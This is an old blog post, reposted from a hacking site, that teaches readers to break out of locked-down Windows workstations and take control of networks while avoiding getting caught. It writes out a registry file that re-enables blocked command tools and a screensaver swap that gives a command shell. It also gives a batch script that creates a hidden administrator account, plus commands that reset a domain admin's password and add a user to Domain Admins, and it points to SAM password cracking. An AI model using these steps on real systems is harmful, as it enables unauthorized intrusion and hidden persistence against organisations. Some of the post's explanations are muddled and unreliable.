---
# http://learn.getgrav.org/content/headers
title: Diffrent ways to Access Command Prompt
slug: diffrent-ways-to-access-command-prompt
# menu: Diffrent ways to Access Command Prompt
date: 22-11-2011
published: true
publish_date: 22-11-2011
# unpublish_date: 22-11-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - cmd
        - hack
        - hacking
        - internet
        - windows
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [cmd,hack,hacking,internet,windows]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

This article is about hacking networks. Since any longer than five minutes, you risk getting caught, this is \*hopefully\* going to teach you how to get root in five minutes or less. So, lets get it started. To those of you that think by getting root, you own everything, sorry to disapoint you. But, by getting root, you only own the comp your on. There is however, a way to get domain root, which I’ll discuss later.

So first of all , try and check your access to DOS. For doing so :  
“start>all programs>accessories>cmd” or “start>run> type in ‘cmd'”

If it doesnt works, go and make a file named “whatever.txt” Right click, and open it in notepad. Type “cmd” in it and save, if you are able to see some black screen fr a second, yes, you can get it. Now change the content in file, i.e

replace “cmd” with following:

@echo off  
echo hello  
pause

If you see “HACKED” on the screen, then yes you are more closer. Finally now change the content to following :  
REGEDIT4   
[HKEY\_CURRENT\_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesWinOldApp]   
“Disabled”=dword:0   
[HKEY\_CURRENT\_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem]  
“DisableRegistryTools”=dword:0

This changes the registry value that blocks dos. So, type “cmd” in the .bat and see if it works. If that also didn’t work, theres still other ways.

Now, type in your commands and click “file>save as>” for the type, put “text document, and save as “anything.bat”.   
If that wasn’t the reason, I hope you have access to the C drive.  
If you do, go here “C:Windowssystem32” and create a new folder.  
Now, find “cmd.exe” and “scrnsave.scr” and copy them to the new folder.  
Goto the folder and rename “scrnsave.scr” to “scrnsaveold.scr”, and “cmd.exe” to “scrnsave.scr” And replace it with the real one in system32. Now the next time your screen saver appears, it will be full access dos. So, if you can, on the desktop, right click and select properties. Change the time to one minute. On windows xp, you may have to make sure the screensaver is “scrnsave”.

Even if it doesnt works, you can go for control panel. yes this one is not gauranteed, but ya at least it may be try at least.

Just create a new folder and rename it to following(obviously only the {} part)

Control panel: {305CA226-D286-468e-B848-2B2E8E697B74}  
Printers: {2227A280-3AEA-1069-A2DE-08002B30309D}   
Taskbar and startmenu: {0DF44EAA-FF21-4412-828E-260A8728E7F1}  
Microsoft FTP folder {63da6ec0-2e98-11cf-8d82-444553540000}  
Temporary Internet files {7BD29E00-76C1-11CF-9DD0-00A0C9034933}   
ActiveX Cache folder {88C6C381-2E85-11D0-94DE-444553540000  
Subscriptions folder {F5175861-2688-11d0-9C5E-00AA00A45957}  
Dial-up networking: {992CFFA0-F557-101A-88EC-00DD010CCC48}   
Scheduled tasks: {D6277990-4C6A-11CF-8D87-00AA0060F5BF}   
Folder options: {6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}   
Dial-Up Networking: {992CFFA0-F557-101A-88EC-00DD010CCC48}   
Scheduled tasks: {D6277990-4C6A-11CF-8D87-00AA0060F5BF}   
History {FF393560-C2A7-11CF-BFF4-444553540000}

Another way to get dos, is to create a prog. Uber0n has created such a program. You can find it at http://www.freewebs.com/uber0n/ You’ll need a c++ compiler.

If so far, nothing has worked. You need to crack the sam file. Pretty sure Cain & Abel has this option.

If you did get dos, it’s time to create yourself an admin acct. Type this.

@echo off  
net user hackplanet hackplanet /add  
net localgroup administrators hackplanet /add  
reg add “HKLMSOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList” /v hackplanet/t REG\_DWORD /d 0

First Line just hides the file address and stuff.  
Second Line Creates the user “hackplanet” with the password of “hackplanet”.  
Third Line adds “upgoingstar” to the administrators group.  
Fourth Line makes the acct “upgoingstar” a hidden acct.  
If you see “The command completed successfully.” or something similiar, congragulations. You now have root. If it didn’t work, it means you have limited access dos, use the screensaver thing.

If you want domain root, you can either find the domain admin’s username and type

@echo off  
net user [username] [newpassword]

That will change the pass.  
Or, if you can get on his/her comp, type this in dos.

net group “Domain Admins” [username] /add

This will add an acct to the domain admins.

Moreover, if you don’t have access to the C drive, or any other particular drive, there are a few ways to view it’s contents. You just need to be able to install programs. Google has a program called “Google Desktop” which indexes the computer and makes it searchable.  
Or, you can download a web browser such as Opera. In the url bar type this “file://” you should now see a list of drives.

Seems funny? Weel, actually it is. 🙂

Source- http://hackplanet.in



Go to our new site- shankee.com
